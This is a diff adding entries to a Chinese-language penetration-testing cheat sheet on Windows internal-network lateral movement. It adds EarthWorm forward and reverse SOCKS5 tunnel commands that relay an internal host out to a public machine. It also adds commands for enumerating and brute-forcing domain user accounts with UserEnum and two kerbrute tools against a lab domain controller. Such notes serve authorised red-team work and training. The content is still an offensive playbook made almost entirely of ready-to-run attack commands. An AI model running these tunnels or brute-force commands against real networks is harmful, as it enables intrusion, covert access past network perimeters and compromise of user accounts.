@@ -80,6 +80,13 @@ windwos内网横穿
 	- 直接在程序前增加proxychains
 	- ``sudo proxychains apt-get update``
 	- 注意：socks代理不支持UDP协议，不支持icmp/ping协议，nmap使用受限。
++ EarthWorm
+	- 正向socks v5代理
+		+ ``./ew -s ssocksd -l 1080``
+	- 反向socks v5代理
+		+ 公网机器运行：``./ew -s rcsocks -l 1080 -e 8888``
+		+ 内网机器运行：``./ew -s rssocks -d 1.1.1.1 -e 8888``
+		+ 通过公网1080端口访问内网机器
 + frp
 	- 官网下载：https://github.com/fatedier/frp/releases
 	- 示例
@@ -352,6 +359,20 @@ IPC$共享利用
 + 当前当前主机当前登录的域和用户：``net config workstation``
 + 查询域用户列表：``net user /domain``
 + 查询域用户详细信息：``wmic useraccount get /all``
++ UserEnum
+	- 项目地址：``https://github.com/sensepost/UserEnum``
+		::
+		
+			python2 -m pip install -r requirements.txt
+			python2 -m pip install asn1tools==0.100.0
+	- 域用户爆破：``python2 UserEnum_LDAP.py 172.16.0.106 hack.lab ~/aduser.txt``
++ kerbrute_linux_amd64
+	- 项目地址：``https://github.com/ropnop/kerbrute``
+	- 域用户爆破：``./kerbrute_linux_amd64 userenum -d hack.lab ~/aduser.txt --dc 172.16.0.106``
++ kerbrute
+	- 项目地址：``https://github.com/TarlogicSecurity/kerbrute``
+	- pip方式：``sudo pip3 install kerbrute``
+	- 域用户爆破：``kerbrute -users ./aduser.txt -domain hack.lab -dc-ip 172.16.0.106``
 
 查找域控制器
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
